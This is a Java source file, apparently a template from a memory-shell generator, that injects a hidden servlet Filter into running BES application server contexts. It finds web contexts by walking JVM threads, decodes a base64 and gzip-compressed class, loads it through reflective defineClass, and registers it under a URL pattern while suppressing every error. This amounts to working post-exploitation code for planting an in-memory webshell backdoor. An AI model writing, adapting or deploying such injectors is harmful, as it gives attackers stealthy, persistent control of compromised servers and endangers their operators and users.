package org.leo.jmg.mem.injectortpl.bes;

import javax.servlet.Filter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class BesFilterInjector {
    
    private static boolean ok = false;

    private static String shellClassName;
    private static String shellClass;
    private static String urlPattern;

    public BesFilterInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            
        }
        if (contexts == null || contexts.isEmpty()) {
       
        } else {
            for (Object context : contexts) {
                try {
                   
                    Object shell = getShell(context);
                    inject(context, shell);
                   
                } catch (Throwable e) {
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }


    /**
     * com.bes.enterprise.webtier.core.DefaultContext
     * /opt/bes/lib/bes-engine.jar
     */
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                Collection<?> values = childrenMap.values();
                for (Object value : values) {
                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            } else if (thread.getContextClassLoader() != null) {
                String name = thread.getContextClassLoader().getClass().getSimpleName();
                if (name.matches(".+WebappClassLoader")) {
                    Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
                    // need WebResourceRoot not DirContext
                    if (resources != null && resources.getClass().getName().endsWith("Root")) {
                        Object context = getFieldValue(resources, "context");
                        contexts.add(context);
                    }
                }
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz = null;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    
    public void inject(Object context, Object filter) throws Exception {
        String filterName = shellClassName;
        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
            return;
        }
        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Object filterDef = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterDef").newInstance();
        Object filterMap = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterMap").newInstance();
        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
        invokeMethod(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{urlPattern});
        try {
            invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
        } catch (Exception e) {
            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
        }

        Constructor<?>[] constructors = contextClassLoader.loadClass("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
        constructors[0].setAccessible(true);
        Object filterConfig = constructors[0].newInstance(context, filterDef);
        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
        filterConfigs.put(filterName, filterConfig);
    }

  

    
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }


}
